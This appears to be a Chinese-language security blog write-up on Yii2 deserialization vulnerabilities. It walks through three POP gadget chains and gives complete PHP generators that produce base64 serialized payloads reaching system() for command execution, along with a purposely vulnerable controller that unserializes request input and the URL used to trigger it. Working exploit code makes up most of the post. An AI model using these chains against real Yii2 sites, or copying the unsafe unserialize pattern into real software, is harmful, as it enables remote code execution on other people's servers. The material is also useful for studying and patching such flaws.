# 原创
：  Yii2反序列化漏洞

# Yii2反序列化漏洞

#### Yii2反序列化漏洞

## 环境搭建

> 



## 反序列化链寻找

> 
在不知道具体细节的情况下，我们可以通过github的change log来观察它的更新情况


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526213153195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526213159981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

### BatchQueryResult (版本&lt;2.0.38)

> 
**起点：**<br/> __destruct 后执行 reset方法，其中 _dataReader可控，现在就是找某个类的close方法，或是call方法，多次尝试之后，还是要通过call方法来触发


> 
**Generator类：**<br/> 这里的call_user_func_array 虽然我们不能控制参数，但是可以控制方法，以数组的方式来执行方法；<br/> 这里的formatter确定了是 close ，但是formatters是我们可以操控的，所以只要设置`formatters[‘close’]=array(‘类名’,‘方法’)`，即可执行一个类的无参方法，此处可以直接用正则找到无参方法中含有call_user_func的类`function \w+\(\) ?\n?\{(.*\n)+call_user_func`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021052622522324.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210526225230758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
**rest\IndexAction类：**<br/> 两个参数都可控，那么可以直接命令执行，构造poc


> 
POP链


```
&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this-&gt;checkAccess = 'system';
            $this-&gt;id = 'dir';
        }
    }
}
namespace Faker{
    use yii\rest\CreateAction;
    class Generator{
        protected $formatters;
        public function __construct(){
            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}
namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{
        private $_dataReader;
        public function __construct(){
            $this-&gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult()));
}
?&gt;

```

> 
在控制器中加上一个反序列化的操作；在controllers目录下新建一个SerController.php，内容如下：


```
&lt;?php

namespace app\controllers;

class SerController extends \yii\web\Controller{
    public function actionUnser($data){
        return unserialize(base64_decode($data));
    }
}

```

> 
Yii2的路由方式是 index.php?r=控制器名/方法名<br/> 所以直接 index.php?r=ser/unser&amp;data=反序列化数据


### RunProcess

> 
在Yii2.0.38中将上面BatchQueryResult添加了__wakeup方法，导致不能作为起点，但是直接搜__destruct还是能找到其他的起点的，RunProcess类


> 
这里processes可控，还是可以用上一条链的后半部分<br/> POP链


```
&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this-&gt;checkAccess = 'system';
            $this-&gt;id = 'tac flag.txt &amp;&amp; ls';
        }
    }
}
namespace Faker{
    use yii\rest\CreateAction;
    class Generator{
        protected $formatters;
        public function __construct(){
            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this-&gt;processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?&gt;

```

### Swift_KeyCache_DiskKeyCache

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210527111650641.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210527111708728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
path可控，可以触发tostring方法


> 
POP链


```
&lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this-&gt;checkAccess = 'system';
            $this-&gt;id = 'tac flag.txt &amp;&amp; dir';
        }
    }
}
namespace Faker{
    use yii\rest\CreateAction;
    class Generator{
        protected $formatters;
        public function __construct(){
            $this-&gt;formatters['saveXML'] = [new CreateAction(), 'run'];
        }
    }
}
namespace Codeception\Util{
    use Faker\Generator;
    class XmlBuilder{
        protected $__dom__;
        public function __construct(){
            $this-&gt;__dom__= new Generator();
        }
    }
}
namespace{
    use Codeception\Util\XmlBuilder;
    class Swift_KeyCache_DiskKeyCache{
        private $path;
        private $keys = [];
        public function __construct(){
            $this-&gt;path = new XmlBuilder();
            $this-&gt;keys = array(
                "null"=&gt;"a"
            );
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache));
}

```

> 
与此类似的POP链还有


```
Swift\KeyCache\DiskKeyCache::__destruct()
-&gt;
src\DocBlock\Tags\See.php::__toString()
-&gt;
Faker\Generator::__call()
-&gt;
yii\rest\IndexAction::run()

```

```
Swift\KeyCache\DiskKeyCache::__destruct()
-&gt;
src\DocBlock\Description.php::__toString()
-&gt;
Faker\Generator::__call()
-&gt;
yii\rest\IndexAction::run()

```
